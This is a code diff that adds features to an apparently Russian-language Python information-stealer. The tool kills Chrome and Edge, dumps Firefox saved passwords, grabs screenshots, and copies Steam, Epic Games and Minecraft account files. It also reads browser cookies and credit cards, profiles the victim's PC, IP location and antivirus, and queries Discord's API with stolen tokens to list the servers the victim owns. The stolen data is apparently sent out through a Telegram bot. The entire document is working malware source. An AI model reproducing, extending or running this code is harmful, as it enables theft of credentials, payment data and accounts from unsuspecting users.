@@ -36,8 +36,14 @@ import vdf
 chat_id = ''#СЮДА CHAT ID
 bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА
 
+
 try:
-    subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im chrome.exe')
+    subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im chrome.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+except:
+    pass
+
+try:
+    subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im msedge.exe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 except:
     pass
 
@@ -85,7 +91,7 @@ try:
         profile = configparser.ConfigParser()
         profile.read(mozilla_profile_ini)
         data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
-        subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
+        subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         subprocess_return = subprocesss.stdout.read()
         passwords = str(subprocess_return)
         with open(dis2+'/browser/Firefox/Saved_Passwords.txt', "a", encoding="utf-8") as file:
@@ -160,8 +166,8 @@ with tempfile.TemporaryDirectory() as temp_dir:
 #screen
 try:
     filename = os.path.join(dis2, 'screenshot.png')
-    with pyautogui.screenshot() as screenshot:
-        screenshot.save(filename)
+    screenshot = ImageGrab.grab()
+    screenshot.save(filename)
 except:
     pass
 #steam
@@ -195,6 +201,15 @@ try:
             file.write(steam_info)
 except:
     pass
+#epicgames
+try:
+    local = os.getenv('LOCALAPPDATA')
+    copied_path = os.path.join(dis, 'Other', "Epic Games")
+    epic_path = os.path.join(local, "EpicGamesLauncher", "Saved", "Config", "Windows")
+    if os.path.isdir(epic_path):
+        shutil.copytree(epic_path, copied_path)
+except:
+    pass 
 #mincraft
 file_path = r"C:\Users\\"+user+"\AppData\Roaming\.minecraft\launcher_accounts.json"
 if os.path.exists(file_path):
@@ -399,7 +414,7 @@ def get_credit_cards(path: str, profile: str, master_key):
 
 def get_cookies(path: str, profile: str, master_key):
     try:
-        cookie_db = f'{path}/{profile}/Network/Cookies'
+        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
         if not os.path.exists(cookie_db):
             return
         result = ""
@@ -546,7 +561,19 @@ try:
 except:
     pass
 #txt
-with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
+import os
+import platform
+import psutil
+import pythoncom
+import socket
+import uuid
+import requests
+import wmi
+import json
+
+
+
+with open(os.path.join(dis, 'pc-info.txt'), 'a', encoding='utf-8') as f:
     try:
         f.write("███╗░░██╗███████╗██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗░░░███████╗██╗░░██╗███████╗\n"
                 "████╗░██║██╔════╝██║░░░██║██║██╔══██╗██║░░░██║██╔════╝░░░██╔════╝╚██╗██╔╝██╔════╝\n"
@@ -575,15 +602,10 @@ with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
         data = json.loads(response.text)
         def format_size(size):
             return round(size / (1024 ** 3), 2)
-        if "Windows" in system_info.system:
-            if "6.1" in platform.win32_ver()[0]:
-                os_version = "Windows 7"
-            elif "10.0.22000" in platform.win32_ver()[1] or "post-10.0.22000" in platform.win32_ver()[1]:
-                os_version = "Windows 11"
-            else:
-                os_version = "Windows 10"
-        else:
-            os_version = system_info.system
+        c = wmi.WMI()
+        for cap in c.Win32_OperatingSystem():
+            os_version = cap.Caption.split(' ')
+            os_version = ' '.join(os_version[1:])
         cpu_percent = psutil.cpu_percent(interval=1)
         pc_info = "Операционная система: "+os_version+"\nИмя узла: "+system_info.node+"\nИмя пользователя: "+user+"\nАрхитектура: "+system_info.machine+"\nПроцессор: "+model_name+"\nЗагрузка процессора: "+str(cpu_percent)+"%\nВидеокарта: "+gpu_info.Name+"\nMAC-адрес: "+mac_address+"\nIP-адрес: "+ip_address+"\nГород: "+data['city']+"\nСтрана: "+data['country']+"\nОЗУ всего: "+str(format_size(ram_info.total))+" ГБ\nОЗУ свободно: "+str(format_size(ram_info.available))+" ГБ\nОЗУ используется: "+str(format_size(ram_info.used))+" ГБ"
         f.write(pc_info)
@@ -603,9 +625,17 @@ with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
         Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
         AntivirusesAll = json.dumps(Antivirus)
         f.write("\nАнтивирусы: "+AntivirusesAll+"\n------------------------")
+        monitors = get_monitors()
+        for i, monitor in enumerate(monitors, start=1):
+            f.write(f"\nМонитор {i}:\n")
+            f.write(f"  Разрешение: {monitor.width}x{monitor.height}")
+        f.write("\n------------------------")
         all_disks = psutil.disk_partitions()
-        for disk in all_disks:
-            f.write(f"\nДиск: {disk.device}\nТочка монтирования: {disk.mountpoint}\nФайловая система: {disk.fstype}\nВсего места: {psutil.disk_usage(disk.mountpoint).total / (1024 ** 3):.2f} Гб\nИспользовано: {psutil.disk_usage(disk.mountpoint).used / (1024 ** 3):.2f} Гб\nСвободно: {psutil.disk_usage(disk.mountpoint).free / (1024 ** 3):.2f} Гб\n------------------------\n")
+        try:
+            for disk in all_disks:
+                f.write(f"\nДиск: {disk.device}\n  Точка монтирования: {disk.mountpoint}\n  Файловая система: {disk.fstype}\n  Всего места: {psutil.disk_usage(disk.mountpoint).total / (1024 ** 3):.2f} Гб\n  Использовано: {psutil.disk_usage(disk.mountpoint).used / (1024 ** 3):.2f} Гб\n  Свободно: {psutil.disk_usage(disk.mountpoint).free / (1024 ** 3):.2f} Гб\n------------------------\n")
+        except:
+            pass
         f.write(f"by corpon")
     except:
         pass
@@ -628,6 +658,39 @@ try:
         os.makedirs(dis2 + '/Other')
     except:
         pass
+    def servers(tok):
+        try:
+            uhqguilds = ''
+            headers = {
+                "Authorization": tok,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+            guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
+            for guild in guilds:
+                if guild["approximate_member_count"] < 1: continue
+                if guild["owner"] or guild["permissions"] == "4398046511103":
+                    inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
+                    try:    cc = "https://discord.gg/"+str(inv[0]['code'])
+                    except: cc = False
+                    uhqguilds += f"{guild['name']} - {str(guild['approximate_member_count'])} Members\n"
+            if uhqguilds == '': return '`no servers`'
+            return uhqguilds
+        except:
+            return 'no servers'
+
+    def form(obj):
+        if len(obj) > 1000: 
+            f = obj.split("\n")
+            obj = ""
+            for i in f:
+                if len(obj)+ len(i) >= 1000: 
+                    obj += "..."
+                    break
+                obj += i + "\n"
+        return obj
+
+
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
@@ -715,8 +778,9 @@ try:
                             days_left = abs((d2 - d1).days)
                         now = datetime.now()
                         saat = now.strftime("%H:%M:%S")
-
-                        embed = f"""{user_name}: {saat}\nEmail: {email}\nТелефон: {phone}\n2FA: {mfa_enabled}\nNitro: {has_nitro}\nИстекает: {days_left if days_left else "None"} day(s)\nToken: {tok}\n""" 
+                        server = form(servers(tok))
+                        if server == "": server = ":lock:"
+                        embed = f"""{user_name}: {saat}\nEmail: {email}\nТелефон: {phone}\n2FA: {mfa_enabled}\nNitro: {has_nitro}\nИстекает: {days_left if days_left else "None"} day(s)\nToken: {tok}\nСервера:\n{server}""" 
                         with open(dis2 + "/Other/discord-token.txt", 'w') as file:
                             file.write(embed)
                 else:
